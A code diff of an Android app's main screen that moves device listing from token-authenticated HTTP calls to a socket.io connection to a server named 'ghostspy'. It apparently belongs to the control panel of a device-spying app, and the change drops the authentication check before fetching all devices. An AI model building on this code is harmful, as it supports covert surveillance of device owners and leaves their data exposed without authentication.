@@ -6,20 +6,19 @@ import android.content.SharedPreferences;
 import android.os.Bundle;
 import android.widget.LinearLayout;
 import android.widget.TextView;
+import io.socket.client.IO;
+import io.socket.client.Socket;
 import org.json.JSONArray;
 import org.json.JSONObject;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
-import java.net.URL;
+import java.net.URISyntaxException;
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainActivity extends Activity {
+    private Socket socket;
     private TextView statusText;
     private LinearLayout deviceContainer;
     private String token, email, role;
-    private static final String SERVER = "https://ghostspy.bruang.biz.id";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -34,30 +33,26 @@ public class MainActivity extends Activity {
         email = prefs.getString("email", "");
         role = prefs.getString("role", "");
 
-        if (token.isEmpty()) {
-            statusText.setText("❌ Tidak terautentikasi");
+        statusText.setText("⏳ Menghubungkan...");
+
+        try {
+            socket = IO.socket("https://ghostspy.bruang.biz.id");
+        } catch (URISyntaxException e) {
+            statusText.setText("❌ URL Error");
             return;
         }
 
-        statusText.setText("⏳ Memuat perangkat...");
-        fetchDevices();
-    }
+        socket.on(Socket.EVENT_CONNECT, args -> {
+            runOnUiThread(() -> {
+                statusText.setText("🟢 ONLINE");
+                // Minta daftar perangkat (nanti bisa kirim token untuk filter)
+                socket.emit("get_devices");
+            });
+        });
 
-    private void fetchDevices() {
-        new Thread(() -> {
+        socket.on("devices_list", args -> {
             try {
-                String urlStr = SERVER + "/api/devices";
-                if (!role.equals("admin")) {
-                    urlStr = SERVER + "/api/my-devices";
-                }
-                URL url = new URL(urlStr);
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestProperty("Authorization", "Bearer " + token);
-                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-                StringBuilder sb = new StringBuilder();
-                String line;
-                while ((line = br.readLine()) != null) sb.append(line);
-                JSONArray devices = new JSONArray(sb.toString());
+                JSONArray devices = (JSONArray) args[0];
                 List<String[]> list = new ArrayList<>();
                 for (int i = 0; i < devices.length(); i++) {
                     JSONObject d = devices.getJSONObject(i);
@@ -134,8 +129,20 @@ public class MainActivity extends Activity {
                     statusText.setText("🟢 " + list.size() + " perangkat");
                 });
             } catch (Exception e) {
-                runOnUiThread(() -> statusText.setText("⚠️ Gagal memuat data"));
+                runOnUiThread(() -> statusText.setText("⚠️ Parse error"));
             }
-        }).start();
+        });
+
+        socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
+            runOnUiThread(() -> statusText.setText("🔴 OFFLINE"));
+        });
+
+        socket.connect();
+    }
+
+    @Override
+    protected void onDestroy() {
+        if (socket != null) socket.disconnect();
+        super.onDestroy();
     }
 }
